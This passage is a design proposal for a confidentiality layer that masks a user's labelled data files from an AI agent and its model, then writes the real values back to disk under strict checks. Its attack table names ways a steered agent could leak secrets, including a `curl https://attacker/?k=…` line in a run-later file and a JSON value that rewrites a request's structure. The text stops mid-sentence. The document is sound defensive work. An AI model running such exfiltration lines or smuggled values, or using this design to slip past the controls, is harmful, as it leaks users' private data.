# Confidentiality Plan 16 — document twins and write-back: per-cell symbols, real values on disk, escaped values on the wire

> **Status: Proposal, 2026-10-16. Nothing here is built.** A code probe of
> `secrets` mode against three everyday tasks (a mail merge over a labelled
> customer list, filling in a form from last year's labelled return, and a
> request body that carries a multi-line secret) found that none of them can
> be done today without giving up the protection. This note proposes four
> pieces that make them work without weakening the invariant: per-cell
> **document twins** (§3), **write-back** of the values the model routed into
> a file (§4), **context-aware escaping** on the wire (§5), and the order to
> build them in (§7). Confidentiality axis only (mode `secrets`); the frozen
> integrity axis is not extended (§4.11 says what is borrowed from it).
> A value the person types into the prompt is beyond Mandu's protection
> boundary by the maintainer's decision (2026-10-16), and this plan does not
> cover writing such a value back.

Spine: [`confidentiality.md`](./confidentiality.md). Builds on
[`confidentiality-plan-10-flow-taint.md`](./confidentiality-plan-10-flow-taint.md)
(the structured twin, §2.4; the interposer, §4.1; the network exit, §4.3),
[`confidentiality-plan-13-reader-set-labels.md`](./confidentiality-plan-13-reader-set-labels.md)
(D4, the live index of derived paths; §4.6, a written file refers to its
sources), [`confidentiality-plan-15-prompt-filter.md`](./confidentiality-plan-15-prompt-filter.md)
(§13.10, why the model's tool_use is never resolved) and
[`arbiter-human-plane.md`](../architecture/arbiter-human-plane.md) (which
channel may return an original).

## 0. At a glance

1. A labelled CSV, TSV, JSON, YAML or `Label: value` text file is twinned
   **per cell**: headers, keys and shape stay, every value is its own
   symbol, named by row and column (`$MDU:nomodel_Read[9bbd].r12.email`).
   The model can address "row 12's email" without reading it.
2. When the model routes such tokens into a file (its own `Write` or `Edit`,
   later a program it runs), Mandu **materializes** the file: the real file
   on disk holds the values, the agent's world keeps reading the token text
   the agent wrote, and the model's transcript never changes.
3. The file is **labelled before a byte of value lands**, at the highest
   level of the symbols it carries, referring to their source files (plan 13
   §4.6), so every later read in the agent's world is its twin and every
   egress is gated by the sources' bindings.
4. Materialization is decided by the arbiter (which symbols, which path,
   which file class) and enacted by the guard (pinned parent, a temporary
   file, a rename), outside the agent's world. Anything it cannot decide or
   enact leaves the tokens in place: the safe direction.
5. The main new risk is a **confused deputy**: the agent picks where real
   values land, and a program outside its world (a git hook the human runs,
   a sync client, a dev server) may read them there. §4.7 to §4.9 restrict
   the destination to data files in the session's workspace, refuse code and
   run-later files, judge a token inside a URL against its bindings, and
   hold the rest for the human.
6. On the wire, net-proxy substitutes each released value **escaped for
   where its token sits** (a JSON string, a URL component, a form field, a
   header), and refuses, without looking at the value, a structured body it
   cannot parse.
7. Order: document twins first (they also close a gap in today's twin of a
   labelled data file, §1.2), wire escaping second, the agent's own writes
   third, program writes fourth.

## 1. What the probe found

### 1.1 Three failures

**A labelled data file is one symbol, or its values are raw.** Extraction is
by file shape (`secretFileShape`, `arbiter/policy/secret-extract.ts`; plan
10 §2.4 "Extraction is by shape, then by pattern"). There is no CSV or TSV
shape: `customers.csv` matches nothing and gets the whole-file twin, one
placeholder, so the model cannot address a row or a field. A `.json` or
`.yaml` goes to the key-name extractors (`json-keys`, `yaml-keys`), which
mask only values under keys that look secret (`SECRET_KEY_RE`); a file with
no such key also gets the whole-file twin (`twinDecision` in
`arbiter/secret-registry/registry.ts`: a shape that found no secret value
and is not exhaustive). Last year's return as JSON (`{"ssn": …, "wages":
…}`) is one symbol.

**Nothing writes a value to disk for the model.** In `secrets` mode a model
that writes a `$MDU:` token writes the token:

- The model proxy never rewrites `Write.content` or `Edit.new_string`
  (`interceptors/anthropic-proxy/src/view-map.ts:17-22`, content-typed
  fields are outside the rewrite registry), and must not: resolving a token
  in the tool_use the agent receives puts the value in the agent's own
  transcript, which the agent re-sends to the model as assistant input the
  proxies do not filter (plan 15 §13.10, "Why not resolve the token at the
  write instead").
- The exec gate never resolves a secret's placeholder in an argv
  (`interceptors/exec-wrap/src/gate.ts:15-19`); the value goes in only at the
  network exit, after the binding check (confidentiality.md §7.1).
- A write into a registered file's twin lands in the twin and is discarded
  at the session's end, with a line naming the file (plan 10 §4.1, "A write
  lands in the twin, and the launcher names it").

Today a real value reaches a file only by four routes, each with a cost:

| Route | Cost |
|---|---|
| A named reader (`readers:` with `prints: nothing`, plan 10 §2.1) reads the source raw and writes the file, tainted | the human writes the rule and pins the program; an agent-written script cannot be a reader (plan 10 §11.6) |
| A HIGH session after `declassify` (confidentiality.md §4) | refused for `no-model`; every shell command then needs the human's approval |
| A local main model for a `local-model` file (`model-endpoints.md`) | the person must run one |
| The person writes the file themselves | the task was the agent's |

**On the wire a value is pasted, not encoded.** net-proxy replaces each
whole token with the value as plain text
(`interceptors/net-proxy/src/egress.ts:87-90`, `substituteTokens`), in the
URL, every header and the body alike. A JSON body whose string holds the
token of a multi-line value (a PEM key, a postal address) or of one with a
quote becomes invalid JSON, and a value that holds `","admin":true,"x":"`
changes the request's structure. Only HTTP Basic is re-encoded
(`substituteInBasic`, plan 10 §11.13.1).

### 1.2 A gap in today's twin of a labelled data file (flagged)

Under a **human** label, a `.json` or `.yaml` data file with at least one
secret-looking key gets the *structured* twin, in which every value under
another key stays as written. Measured on master (2026-10-16) with
`extractSecretSpans` and `renderStructuredTwin`:

```yaml
# return.yaml, labelled no-model by its owner; its twin:
ssn: 123-45-6789
wages: 81234
password: $MDU:nomodel_Read[9bbd].password
```

The twin's lines are not fingerprints of the file (plan 10 §11.8, "A twin
line is no fingerprint"), and a twin piece read by the agent is released to
the model (plan 10 §11.8, *Release*), so `ssn` and `wages` reach the model
raw although the person labelled the file `no-model`. This is the documented
recall limit of the key-name extractor (secret-discovery.md §2.5,
"Recall inside a structured file"; `guarantees.md` §3, "A value Mandu does
not recognize in a structured file stays as written"), which was written for
credential files a catalog names. For a file a person labels as a whole, it
contradicts what the label says. **This is a confidentiality gap in the
current build, not in this proposal**; the document twin of §3 closes it by
masking every value of a labelled data file. Until then, the user docs
should say plainly that a labelled data file in JSON or YAML is protected
only for its secret-named keys.

**Confirmed end to end and documented as interim (2026-10-16).** Over a
real arbiter and the production proxy wiring, a labelled `return.yaml`,
`.json`, `.toml`, `.ini` and `.xml` each twin per key, and `ssn` and
`wages` reach the model-facing request through Claude Code's Read of the
twin and through a `cat` that does not name the path (`cat ./ret*`); a
`cat` naming the path is masked whole. A labelled dotenv keeps integers
and plain words raw. A whole-file twin for every non-catalog label
without `extract:` was prototyped and closed the gap, but it breaks the
labelled MCP-config flow (`labelled-mcp-config-twin`: Claude Code could
not parse a whole-file `.mcp.json`), so the maintainer kept today's
behaviour and documented it as a known gap (guarantees.md §3, usage.md,
secret-discovery.md §2.5, plan 10 §2.4), with the workarounds that hold
(`extract:` matching every value, a file of no known shape, `mandu why`).
`tests/stack/labelled-data-file-twin.test.ts` pins it as a KNOWN LIMIT;
§3 must flip it. A labelled config whose program must parse it (an
`.mcp.json`) still needs its structure kept, so §3's per-cell twin needs a
way to tell such a file from a data file.

## 2. Principles

- **P1. The model sees tokens only.** No piece of this plan resolves a token
  anywhere the model or the agent's transcript can read it.
- **P2. Label before bytes.** A file receives a value only after its label
  is recorded and the guard's index knows the path, so no open in the
  agent's world can see the value in the window between.
- **P3. Decisions never depend on a value.** Whether a token is
  materialized, released, escaped or refused is a function of the token's
  name, its row's level and bindings, the path, the file's class and the
  token's lexical place in the agent's own text. Otherwise each refusal
  tells the agent a bit about the value (§4.7, row "outcome oracle").
- **P4. Failure leaves the tokens.** An unreachable arbiter, a missing
  guard, an unparseable file, a limit: the file keeps the text the agent
  wrote. Tokens are opaque, so this fails closed.
- **P5. The agent's world sees what the agent wrote.** The twin of a
  materialized file is the agent's own token text, byte for byte. Nothing
  the agent can read changes when the real file does.
- **P6. Only a human relaxes.** Every key that shows more (a public column,
  a destination outside the workspace) lives in the arbiter-owned
  `policy.yaml` or an Inbox answer, never in a file the agent can write
  (plan 10 §11.6).

## 3. Document twins

### 3.1 Which files, in which order

A new extraction mode, `document`, applies to a registered file when all of
these hold:

1. its label comes from a **human** (`policy.yaml` `paths[]`, a dashboard
   label) or is **derived** (plan 13 §4.6), not from the catalog: a catalog
   credential file keeps its credential extractor (`.env`, `.npmrc`,
   `~/.aws/credentials`, …), whose job is to keep the file usable by the
   program that parses it;
2. its shape is one of `csv`, `tsv`, `json-doc`, `yaml-doc` or `kv-text`
   (by extension, then by a sniff of the first 64 KiB for `.txt` and files
   with none);
3. the paths entry does not say `twin: whole` (the person's way back to one
   placeholder).

For a human-labelled `.json` or `.yaml`, `document` replaces `json-keys` and
`yaml-keys`: it masks every value those mask and every other one, so the
change only hides more values (closing §1.2) while showing the keys of a
file that today is one placeholder (§3.5 says what that discloses). A
`paths[]` entry may also say `twin: document` to opt a file of an
unrecognized extension in, under the same parsers.

### 3.2 What the model sees

`customers.csv` (`name,email,plan,signup`), labelled `no-model`:

```
name,email,plan,signup
$MDU:nomodel_Read[9bbd].r1.name,$MDU:nomodel_Read[9bbd].r1.email,$MDU:nomodel_Read[9bbd].r1.plan,$MDU:nomodel_Read[9bbd].r1.signup
$MDU:nomodel_Read[9bbd].r2.name,$MDU:nomodel_Read[9bbd].r2.email,$MDU:nomodel_Read[9bbd].r2.plan,$MDU:nomodel_Read[9bbd].r2.signup
```

With `public_fields: [plan]` on the entry (§3.10) the `plan` column reads as
written. Last year's return as JSON:

```json
{"taxpayer": {"name": "$MDU:nomodel_Read[51c0].taxpayer.name",
              "ssn":  "$MDU:nomodel_Read[51c0].taxpayer.ssn"},
 "income": [{"employer": "$MDU:nomodel_Read[51c0].income.0.employer",
             "wages":    "$MDU:nomodel_Read[51c0].income.0.wages"}]}
```

A `kv-text` file (`Name: …`, `Filing status: …`, one assignment per line)
keeps each label and masks each value; a line that is no assignment, blank
or a `#` comment is masked whole as `line<N>`, as dotenv's parser does for
a line it cannot read (plan 10 §2.4.1).

The token is a valid cell, JSON string and YAML plain scalar: it holds none
of `,`, `"`, a tab or a line break, and starts with `$`. In a YAML flow
collection, where `[` and `]` are indicators, it is single-quoted, as
plan 10's list items already are (`wrap`, 2026-10-10). A JSON number,
boolean or `null` becomes a string token, so the twin still parses; the
type is restored when a value is written back (§4.4, step 6) or released.

### 3.3 Naming

The token grammar is the existing one, `$MDU:<tag>[<hash>].<field>`, with
`<field>` drawn from `[A-Za-z0-9_[\].]` and starting with a letter or `_`
(`arbiter/symbol-table/symbol-format.ts`, `canonicalSymbolField`). The
`<hash>` is the file's base symbol's, as for every field row today
(`mintFields`), so all of one file's cells read as fields of one file.

| Shape | Field | Example |
|---|---|---|
| `csv`, `tsv` | `r<N>.<column>`; N is the 1-based data record (a quoted field may span lines, so records are not lines) | `r12.email` |
| `json-doc`, `yaml-doc` | the key path joined by `.`; a root array's elements are `r<N>` (1-based, as in a CSV); a nested list keeps plan 10's `<list>.<index>` (0-based) | `taxpayer.ssn`, `r3.email`, `income.0.wages` |
| `kv-text` | the label | `Filing_status` |

`<column>` and a key segment are the header or key itself when it is an
identifier (`^[A-Za-z_][A-Za-z0-9_]{0,63}$`). Otherwise runs of other
characters become `_` (`E-mail Address` → `E_mail_Address`), and a name
that is then empty, starts with a digit, or collides with another column is
`c<N>` (1-based column) or `k<N>`. `.`, `[` and `]` never come from a
header, so a name parses one way.

**Stability.** A name holds while the file's bytes do. A changed file is a
new base row with a new hash (the base row is allocated by the whole
content, `registerSecret`), so a token the model saw before the change
keeps its old value and never silently points at another customer after a
row was inserted. With `row_key: <column>` on the entry (§3.10), the row
part is that column's value (`rC1042.email`) and survives reordering; only
a column listed in `public_fields` may be a row key, since its value is in
every token.

### 3.4 One symbol per cell, never per value

Two cells with equal values get two tokens. The twin therefore says nothing
about which customers share a plan or a city. This differs from the
structured twin, which replaces a repeated copy of a value with the same
token (`renderStructuredTwin`, `twinNeedles`, plan 10 §2.4 "Every
occurrence of a value is its symbol"): in a credential file the repeat is a
copy of one secret; in a data file it is a coincidence between records. A
value that also appears outside any cell (a comment in YAML) is masked with
the first cell's token, as today.

### 3.5 Headers and keys: what stays raw

Headers and keys stay raw because they are the interface the model needs to
address the data, as the structured twin keeps a config file's keys
(plan 10 §2.4). They can still carry data: a JSON map keyed by e-mail
address, a CSV whose header row is a data row. A header or key is shown
only when it passes the **identifier test**: at most 64 characters, letters,
digits, spaces, `_`, `-`, `.`, `(`, `)`, `/` only, no detector format
(`locateSecretShapes`), not e-mail-, phone- or URL-shaped, and not
`looksLikeSecretValue`. One failing header masks the whole header row (each
header a `r0.c<N>` token, columns named `c<N>`); one failing key in a
mapping masks every key of that mapping (`k<N>`). What the twin discloses
is then the shape: row and column counts, key names, nesting, which cells
are empty (§9, question 3).

### 3.6 Limits and the fall-back

| Limit | Value (proposed) | Beyond it |
|---|---|---|
| File size | `MAX_STRUCTURED_BYTES`, 8 MiB (as today) | whole-file twin |
| Cells | 10 000 per file | whole-file twin |
| Nesting | `MAX_LIST_DEPTH`, 64 (as today) | whole-file twin |
| Header or key length | 64 for the identifier test, `MAX_FIELD_NAME` 2048 for the name | the header row or mapping masked (§3.5) |

The whole-file twin is also kept for: text that is not UTF-8 or holds a
NUL; a CSV with an unbalanced quote; a YAML document outside the subset the
parser reads (anchors, aliases, tags, multi-document streams, complex keys;
a block scalar is one value); a JSON that does not parse. `mandu why` says
which limit applied ("document too large: 48 000 values, limit 10 000").
Every walk stays linear in the file, as the extractor's do
(secret-discovery.md §2.5), because `whyPath` runs it from the data socket.

The cell limit bounds one symbol-table row per cell. A larger file needs
fields that are not rows (a name resolved by parsing the stored base value
at the moment it is released); that is left for a measured need (§9,
question 11).

### 3.7 Relation to the structured twin and `twinFormOf`

The same machinery, the opposite default. The structured twin keeps a value
raw unless it looks secret, because a config file's other values are what
its program needs (`PORT=3000`); the document twin masks every value,
because in a data file the values are the data. Both produce
`SecretSpan`s, mint field rows with `mintFields`, render with
`renderStructuredTwin` (with the repeat rule of §3.4) and release at the
file's bindings.

`twinFormOf` and `twinDecision` gain a form: `document`, with the shape, the
count of values masked, the rows and columns (CSV, TSV) and the count of
public fields. `mandu why` and the dashboard's Why read it ("document twin:
50 rows × 4 columns, 150 values masked, column `plan` shown by your
policy"). The `whyPath` bounds of `arbiter/ipc/why-preview.ts` apply
unchanged.

### 3.8 The model-facing release

A document twin is released to the model through the existing twin rules,
unchanged in kind: the agent's Read of the twin, and a shell result that is
one contiguous piece of one file's twin with the guard's `twinOf` evidence
(plan 10 §11.8, *Content* and *Evidence*). `head -20 customers.csv` is
released; `cut -d, -f2 customers.csv` is masked whole, because a column is
not one contiguous piece. Two consequences to decide:

- The release caps a result at 256 KiB. A token is about 35 bytes, so a
  twin grows about two to four times over its file; a 100 KiB CSV may
  exceed the cap and be masked whole. The cell limit (§3.6) should be read
  against this cap, not only the symbol table.
- Relaxing *contiguous* to "every token is a field of a file the call's
  tree read as a twin, and the tree opened nothing raw" would release
  `cut`, `awk` and `sort` output. With the guard's evidence the output can
  hold only twin text and unlabelled input, so it is plausible, but it is a
  relaxation of a fail-closed rule (§9, question 10).

### 3.9 The value backstop

Each cell's row joins the value backstop like any field row: a value of 8
or more characters (`MIN_FINGERPRINT_LEN`,
`arbiter/policy/egress-fingerprint.ts`) masks any tool result that holds it.
In a data file many values are ordinary words (`complete`, `Seoul`,
`premium`), so a registered customer list could mask unrelated results that
happen to contain them. Proposal: a document cell joins the backstop only
when it is credential-shaped or at least 12 characters and is not a
dictionary word, and the cost is measured on a real list before this
default is set (§9, question 9). The twin's own lines stay no fingerprint
(`withoutTwinLines`).

### 3.10 What a human may show

On the `paths[]` entry, in `policy.yaml` only (P6):

```yaml
paths:
  - path: ~/biz/customers.csv
    level: no-model
    bindings: [smtp.example-mail.com:587, api.example-mail.com]
    public_fields: [plan, signup]   # columns or key paths shown as written
    row_key: customer_id            # must be a public field
    twin: document                  # or whole; default by §3.1
```

`public_fields` is a relaxation and is refused from every source but the
person's own policy and an Inbox answer. A public field's values are not
registered.

## 4. Write-back: materializing a file the model wrote

### 4.1 The model: two renderings of one file

The frozen integrity axis kept two trees, the AgentView worktree and the
person's HumanView, and synced them (integrity/fs-sync.md §1.2). `secrets`
mode has no AgentView tree, but it already gives each registered or derived
file two renderings: the real file, and the twin the guard serves to every
open in the agent's world (plan 10 §4.1; plan 13 D4 for derived paths,
served from the launch's `derived-twins/`). Write-back uses exactly that:

> A **materialized file** is a derived file whose twin is the text the agent
> wrote (tokens and all) and whose real bytes are that text with each token
> replaced by its value, encoded for where the token sits.

The agent, every program it runs and the model keep seeing the token text
(P5). The person, their editor and programs outside the agent's world see
the values. No tool_use, tool_result or transcript changes (P1).

### 4.2 Trigger

**The agent's own whole-content write (phase 3).** The model proxy already
records each believed `Write` call and the arbiter keeps a SHA-256 of its
`content` by session and path (`ownWriteHashes`, `noteOwnWrite`; plan 15
§13.10). When the next request carries that call's tool_result and the
result is the agent's own success notice (`own-write-notice.ts`, plan 15
§13.10, "A Write's own result"), the proxy calls a new op,
`materializeWrite {session, callId}`, on its human client, off the wire path.
The op answers at once with the decision (§4.3); the enactment (§4.4) runs
after it. Because the agent's world never sees the change (P5), the agent's
next tool call needs to wait for nothing: before and after, its open of the
path returns the token text.

**A later write to a materialized file (phase 3).** A write-intent open of a
derived path in the agent's world lands in its twin, as for any twinned
file (plan 10 §4.1). For a materialized file the twin is the agent's file,
so the next tool-call boundary re-materializes: the guard reports the
twin's new hash, and the arbiter decides on the new text as on a first
write. This covers `Edit`, `MultiEdit`, and `sed -i` on a materialized
file, with no record of what the edit was: the decision reads only the text.

**Files a program writes (phase 4).** §4.12.

Not a trigger: the event stream. fs-sync's watcher could rely on best-effort
events because a missed sync was harmless (integrity/fs-sync.md §2.4,
"Caveat"); here a missed trigger is harmless too (P4), but the label must be
recorded in the same step as the decision, so the decision is a direct op.

### 4.3 The decision (arbiter, a pure function)

`materializeDecision(text, path, session, policy)` returns
`materialize | hold | refuse` with a reason, and for `materialize` the label
to mint. It reads only the agent's text, the path's metadata and the symbol
rows; never a value (P3).

**Tokens.** Every whole token in the text (`symbolPattern`) is examined:

1. It names a row that exists, of a **registered file** (`isRegisteredFileRow`:
   a base or field row of a file the registry twinned, document cells
   included). Rows of other kinds (a masked tool result, an environment
   variable, a prompt-filter mask) are not materialized in this plan; such a
   token stays as written.
2. The session was shown it or read its file's twin. This needs a new
   per-session record of the symbols the proxies forwarded to the model,
   kept as `session_label_sources` is for a high session
   (confidentiality.md §4), plus the guard's `twinOf` records. A
   well-formed token for a row the session never met (a guessed `r40`, a
   token copied from another session's transcript) stays as written.
3. Its row's policy admits materialization: `materialize: allow | ask |
   never` on the `paths[]` entry, defaulting (§9, question 5) to `allow` for
   a human-labelled data file, `ask` for a catalog credential, and `never`
   for a private key (`ssh`, `pgp`, `pem` shapes).
4. Its **place** in the text (the parse state of the file's class at the
   token's offset, §4.4 step 6): a token inside a URL is judged by
   `desymbolizationDecision` with boundary `network` against that URL's host
   (released only at a binding, otherwise `ask`); a token in a file of the
   *code* class (below) is `asCommand` and refused.

**Destination.** The path, resolved the way the guard resolves it (pinned
parent, `secret_open::split_parent_leaf`), must be:

- under a workspace root of the session, or under a directory that holds
  one of the tokens' source files (the same place the person already keeps
  the data); anywhere else is `ask`;
- a regular file or a new name: never a symlink leaf, a FIFO, a socket, a
  device, a directory, or a regular file with `st_nlink > 1`;
- not write-protected (`write-protection.md` §2: Mandu's files, files that
  run later) and not under `.git/`, an agent store
  (confidentiality.md §8, "An agent's own stores") or Mandu's home;
- not a registered file labelled by a human or the catalog (the source
  itself, `.env`): writing back into a person's own secret file is phase 5;
- not under a directory whose mode lets other users write (`/tmp`, a
  sticky world-writable directory): `ask`;
- of the **data** class: an allow-list by extension (`.csv`, `.tsv`,
  `.txt`, `.md`, `.eml`, `.json`, `.yaml`, `.yml`, `.xml`, `.html`) and not
  a known run-later or build file by name and place (`Makefile`,
  `package.json`, `pyproject.toml`, `Dockerfile`, `.envrc`, `*.sh`, CI
  configuration such as `.github/workflows/*` and `.gitlab-ci.yml`, editor
  task files such as `.vscode/tasks.json`). Every other file is the *code*
  class: `ask` when it holds no token in a command place, else refused;
- tracked by git: `ask` (committing it is the next natural step, and the
  person's own `git commit -a` would record the values; §9, question 6).

**The label.** A materialized file's derived row refers to the files its
tokens came from (`sources`), so its level is at least the highest of
theirs and its destinations are the intersection of their bindings, both
evaluated at every lookup (plan 13 §4.6, `composedLabel` in
`arbiter/policy/label-lookup.ts`). The label is raise-only
(`derived-labels.ts`). One case raise-only does not cover: an exact human
label on the path wins in either direction (confidentiality.md §8,
"Declassification is first-class"), so a path a person once labelled
`public` would make the materialized file public and the agent's next read
raw. The decision therefore computes the composed label the path would have
after the mint, and refuses unless it is at least the tokens' highest level.

**Bounds.** At most 8 MiB of text and 10 000 tokens per file, as §3.6.

### 4.4 The enactment (guard)

The guard (`mandu-net-guard`) already performs every open of the agent's
tree with pinned parents, keeps the live derived index, serves twins and
their `stat` metadata, and holds the arbiter's human channel
(`arbiter-human-plane.md` §2). It is the one process that can order the
label, the index and the bytes with respect to every open in the agent's
world (P2). For a `materialize` decision:

1. **Lock the leaf.** Opens of the path in the agent's world wait (bounded,
   then `EAGAIN`) while the following runs.
2. **Check the bytes.** Re-open the leaf through the pinned parent
   (`O_NOFOLLOW`, regular file only, `st_nlink == 1`) and compare its
   SHA-256 with the hash the decision was made on. Any difference ends here,
   tokens kept (the agent or the person changed it meanwhile).
3. **Write the twin.** Copy the agent's text into `derived-twins/` with the
   leaf's mtime (`utimensat`), so an agent that compares mtimes before an
   `Edit` (Claude Code refuses an edit of a file "modified since read") sees
   its own write.
4. **Mint the label and index the path.** The arbiter records the derived
   row (§4.3); the guard enters the path and the leaf's identity in its
   derived index **before** any value is written. From here every open in
   the agent's world, and every `stat` of the path, is the twin's.
5. **Fetch the values.** The guard asks the arbiter, on the human channel,
   for the rendered bytes (`materializeRender {decisionId}`, a human-plane
   op: it returns originals, `arbiter-human-plane.md` §3). An alternative
   that keeps every value out of the guard's memory is to pass the
   temporary file's descriptor to the arbiter, which writes into it (§9,
   question 7).
6. **Render.** Each token is replaced by its value encoded for its place in
   the file's class, by the one encoder §5.4 shares with the wire: a JSON
   string escape (and a number, boolean or `null` restored as such where
   the token is the whole string of a value the source held unquoted); a
   CSV field quoted, with its quotes doubled, when the value needs it; a
   YAML scalar re-quoted; an XML or HTML entity escape; plain text as is.
   Where the file does not parse in its class, every token is written as
   plain text: the choice depends on the text, never on a value (P3).
7. **Place the bytes.** `O_TMPFILE` in the pinned parent, mode `0600` for a
   new file (an existing file keeps its owner bits and loses the group's
   and others' read, §9, question 12), the rendered bytes, `fsync`, link
   it under a temporary name (`linkat` through `/proc/self/fd`), and
   `renameat` it over the leaf. The rename replaces the name, not the
   inode: a descriptor the agent's world still holds on the old inode keeps
   reading the token text, and a hard link made to the old inode before the
   step still names the token text.
8. **Unlock and record.** The path, the sources, the count of values and
   the decision go to the session's event stream (no value), and the
   proxy's next note on the call's result says what happened (§4.6).

A failure at any step after 4 leaves the label in place over a file that
still holds tokens: over-labelled, never under-labelled.

### 4.5 Later, the session's end, the next session

- **A later write** in the agent's world lands in the twin (§4.2) and is
  re-materialized at the next boundary through the same steps.
- **A person's edit of the real file** during the session (step 2 finds a
  hash that is neither the last rendering nor the agent's text) detaches
  the file: no further materialization, the twin stays as it was, and the
  session's end names it. Re-symbolizing the person's edit into the twin is
  what fs-sync's `reconcileHumanEdits` does on the frozen axis
  (integrity/fs-sync.md §2.5a); it is phase 5 (§9, question 8).
- **The session's end.** The launcher lists every materialized file by path
  (sanitized as the twin-write lines are, plan 10 §4.1), with its sources
  and level, beside the existing lines for discarded twin writes, and
  `session_exit` carries them (`materializedWrites`).
- **The next session.** Discovery lists every derived path that still
  classifies secret (plan 13 D4, "The next launch"), so the file is twinned
  from the launch. Its twin is then rendered by the document twin (§3) or
  the whole-file twin, no longer the previous session's text, so the next
  session's tokens are new names for the same values.
- **Release.** The person releases a materialized file by an exact-path
  label or by clearing its derived row (confidentiality.md §8), as for any
  derived file.

### 4.6 What the transcript holds

The tool_use keeps the token text; the agent's success notice is released
as it is today (plan 15 §13.10); the agent's file-state cache matches the
twin (§4.4 step 3). The only addition is one line after the notice, in
Mandu's voice, on the request after the decision (plan 10 §11.8, "Every
mask and every denial explains itself in the tool result"):

> `[mandu:secret] wrote back: your copy of drafts/r12.eml keeps the
> placeholders you wrote; the user's file holds the real values (3, from
> customers.csv).`

or, for a refusal, which place or rule kept the placeholders, never
anything about a value. The line is added after the notice is classified,
so the notice's own release rule is unchanged.

### 4.7 Attack analysis

Mandu's boundary is the agent's world. Programs outside it are the
person's, the HumanView in the paper's terms, and may read the person's
files today, the source file included. Write-back adds copies of values in
places the agent chose; the attacks are about where those copies go and
who reads them.

| Attack | Today | With write-back | Defense |
|---|---|---|---|
| Write the token into a file an unlabelled program in the agent's world then sends (`curl --data @drafts/x.eml`) | the program sends the token; net-proxy releases it only at a binding | unchanged: the program opens the twin (§4.4 step 4), sends tokens, the egress gate decides per token | label and index before bytes (P2); the guard's derived index is fail-closed when it cannot be refreshed (plan 13 D4) |
| `git add` and `git commit` in the agent's world | git reads twins, the repository records tokens (plan 10 §2.4) | the same | — |
| The person's own `git commit -a` after the session | records tokens | records values, which a push sends | git-tracked destination is `ask`; the end-of-session line names the file (§4.5) |
| A file that runs later outside the agent's world: a git hook, a `Makefile` target, a `package.json` script, a CI workflow, an `.envrc`, with `curl https://attacker/?k=$MDU:…` | runs with a token | would send the value when the person runs it | write-protected and code-class paths refused; a token inside a URL judged against that URL's host (§4.3) |
| A sync client (Dropbox, OneDrive, iCloud Drive), a dev server or a backup reads a new place | nothing to read | reads values where the agent put them | destination limited to the workspace and the sources' own directories; other places `ask` |
| An editor's cloud assistant reads the open workspace and sends files to its model | could read the source file already | reads the copies too | not closable by Mandu; the copies sit beside the source, which that assistant already reads (§9, question 6) |
| A world-readable or shared path (`/tmp`, a group-writable directory) | — | other local users read the values | `ask` for such directories; new files `0600` |
| A path outside the workspace | — | values anywhere the person's user can write | `ask` |
| A FIFO, socket or device at the path: the value goes straight to a reader in the agent's world | — | would deliver the value raw | regular files only, checked on the pinned leaf (§4.4 step 2) |
| A symlink or a swapped directory component sends the write elsewhere | — | would write outside the checked path | pinned parent, `O_NOFOLLOW` leaf, `renameat` relative to the pinned descriptor (the guard's `judge_change` discipline, write-protection.md §2) |
| A hard link made beforehand to read the real bytes under another name | — | the rename replaces the name, so an earlier link keeps the token text; a link made afterwards is a link of a derived file, labelled by `followDerivedLabel` (plan 13 D4) | `st_nlink == 1` required at step 2 |
| The model later reads the file raw | — | only if the path's label is below the values' | the composed-label check of §4.3; a `gated` posture never materializes (§4.10) |
| A descriptor the agent held open from before (the Write's own) | — | points at the old inode, the token text | rename semantics (§4.4 step 7) |
| `stat`, `du`, `find -size` read the real file's size, a length oracle | — | would show the rendered size | the guard answers a `stat` of a twinned path with the twin's metadata (confidentiality.md §7.2a, "Guard-only metadata"); a materialized path must get the same answer from step 4 on, which the kernel tests check (§8) |
| Outcome oracle: the agent learns from a refusal whether a value holds a quote or a line break | — | would leak a bit per attempt if the encoder refused on the value | every decision is value-independent (P3) |
| A token the session never saw (guessed `r40`, another file's hash) | resolved nowhere | — | rule 2 of §4.3: only tokens the session met |
| Laundering a level down through a path with an exact `public` label | — | the next read would be raw | refuse when the composed label would be below the tokens' (§4.3) |
| A write-back into the person's own `.env` or `customers.csv` | lands in the twin, discarded | — | refused in this plan (§4.3); phase 5 |

**The confused deputy.** The guard and the arbiter hold the values and act
on a request the agent's text makes. In `secrets` mode the agent may be
steered by text it read (the integrity axis is off), so the request must be
judged as an attacker's: *which* values (only rows of registered files the
session met, never a private key by default), *where* (data files beside
the data), *in what place in the text* (never a command, a URL only to a
binding), and *who decided* (the arbiter's policy or the person in the
Inbox, never the agent). Under those rules the deputy writes a value only
where the person already keeps that value and in a form no program runs.
What remains is the person's own later act on the file, which the
end-of-session line and the Inbox for git-tracked files make visible.

### 4.8 Allowed, held, refused

| Case | Answer |
|---|---|
| Tokens of a human-labelled data file, into a new data-class file under the workspace | materialize |
| The same into an existing unlabelled data file under the workspace | materialize; the file becomes labelled at the sources' level |
| A catalog credential's token (a `.env` value, an API key) into any file | `ask` (Inbox: path, sources, the agent's text with tokens) |
| A destination outside the workspace and the sources' directories, a shared directory, a git-tracked file | `ask` |
| A code-class file with tokens in data places only | `ask` |
| A token in a command place, a token in a URL to an unbound host | refuse that file (tokens stay) |
| A private key's token, a row the session never met, a non-registry row | that token stays as written; the others are decided |
| A FIFO, socket, device, symlink leaf, hard-linked file, write-protected path, `.git/`, an agent store, Mandu's home, a human- or catalog-labelled file | refuse |
| An exact human label on the path below the tokens' level | refuse |
| Arbiter unreachable, guard absent, decision timeout, any check of §4.4 failing | tokens stay |

An Inbox answer reuses the approval queue (`egress_approvals`), with
*once*, *this folder for this session* and *deny*. A hold does not block
the agent: the file holds tokens until the person answers.

### 4.9 What the person sees

The product page's session view shows each materialized file (path,
sources, count of values) and each refusal with its reason, beside the
twin-write lines. The reply filter already shows the person the values of
the tokens in the agent's reply (`reply-filter`), so "I wrote 50 drafts"
reads with real names.

### 4.10 Postures and platforms

Write-back runs only in the `confined` posture with the guard (plan 10
§4.1; rootless-confinement-ubuntu-2404.md): the guard's derived index is
the mechanism that keeps the values out of the agent's world. In `gated`
(no guard) the bind-mount twins are fixed at launch and a new path cannot
be twinned, so nothing is materialized and the note says why. On macOS the
whole-agent profile denies rather than twins (confidentiality.md §7.3), so a
materialized file would become unreadable to the agent that wrote it;
write-back stays off there until a twin-serving mechanism exists (§9,
question 13).

### 4.11 The frozen write-back, and what is reused

fs-sync (integrity/fs-sync.md) desymbolized the whole AgentView tree into
the HumanView at each tool-call boundary, through the deep, ungated
`desymbolize`, because under the integrity axis the person may see
untrusted data and the HumanView was the trusted destination
